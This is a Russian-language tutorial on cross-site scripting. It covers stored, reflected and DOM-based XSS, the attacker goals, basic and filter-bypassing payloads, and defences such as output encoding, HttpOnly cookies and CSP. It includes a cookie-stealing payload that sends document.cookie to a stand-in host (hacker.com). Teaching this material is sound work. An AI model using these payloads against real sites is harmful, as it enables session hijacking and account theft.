**XSS (Cross-Site Scripting)** — это атака, при которой вредоносный код (обычно на языке JavaScript) внедряется в веб-страницу и исполняется в браузере пользователя.

Главная проблема здесь в том, что браузер **доверяет** всему коду, который приходит от сервера, и не может отличить полезный скрипт сайта от злого скрипта хакера.

---

### **1. Виды XSS (Как это работает?)**

Пентестеры разделяют XSS на три основных типа в зависимости от того, как скрипт попадает к жертве.

#### **А. Stored XSS (Постоянная)**

Самый опасный вид. Скрипт физически сохраняется в базе данных сервера (например, в комментарии, профиле или названии товара).

- **Сценарий:** Хакер оставляет отзыв к товару: `Отличный товар! <script>...код...</script>`.
    
- **Результат:** Каждый раз, когда любой пользователь (или админ) открывает страницу с этим отзывом, его браузер автоматически исполняет этот код.
    

#### **Б. Reflected XSS (Отраженная)**

Скрипт не сохраняется на сервере, а «отражается» от него в реальном времени. Код передается через URL.

- **Сценарий:** Сайт выводит поисковый запрос на странице: «Вы искали: [ваш запрос]».
    
- **Атака:** Хакер формирует ссылку: `http://site.com/search?q=<script>alert('XSS')</script>` и присылает её жертве.
    
- **Результат:** Жертва кликает, сервер берет код из ссылки, вставляет его в страницу и возвращает браузеру. Браузер исполняет код.
    

#### **В. DOM-based XSS**

Здесь сервер вообще может быть не задействован. Уязвимость находится в легитимном JavaScript-коде самого сайта, который неправильно обрабатывает данные из адресной строки (через фрагмент после символа `#`).

---

### **2. Что может сделать хакер с помощью XSS?**

JavaScript в браузере имеет огромные возможности. С помощью XSS можно:

1. **Украсть Cookies (Session Hijacking):** Самая частая цель. Хакер забирает твою куку сессии и заходит в твой аккаунт без пароля.
    
    - _Пейлоад:_ `<script>new Image().src="http://hacker.com/log?c="+document.cookie;</script>`
        
2. **Подменить содержимое (Content Spoofing):** Например, заменить форму логина на фальшивую, чтобы ты сам ввел пароль.
    
3. **Выполнять действия от имени юзера:** Поставить «лайк», отправить сообщение всем друзьям или сменить почту в настройках.
    
4. **Кейлоггинг:** Скрыто записывать всё, что пользователь печатает на этой странице.
    

---

### **3. Анатомия пейлоада (Твоего оружия)**

Пейлоад — это тот самый кусок кода, который мы внедряем. Самый простой способ проверить уязвимость — вызвать всплывающее окно:

- `<script>alert(1)</script>` — классика.
    
- `<img src=x onerror=alert(1)>` — если тег `<script>` фильтруется, мы используем картинку с битой ссылкой, которая выполнит код при ошибке.
    
- `<svg onload=alert(1)>` — еще один обход фильтров.
    

---

### **4. Как защититься?**

Разработчики используют несколько линий обороны:

- **Output Encoding (Экранирование):** Самый важный метод. Все спецсимволы превращаются в безопасный текст. Вместо `<` сервер отправляет `&lt;`. Браузер просто отобразит это как текст, не исполняя код.
    
- **HttpOnly Cookie:** Специальный флаг для куки, который запрещает JavaScript обращаться к ним. Даже если на сайте есть XSS, украсть сессию через `document.cookie` не получится.
    
- **CSP (Content Security Policy):** Инструкция для браузера, которая говорит: «Загружай скрипты только с моего домена». Она блокирует любые попытки выполнить чужой код.
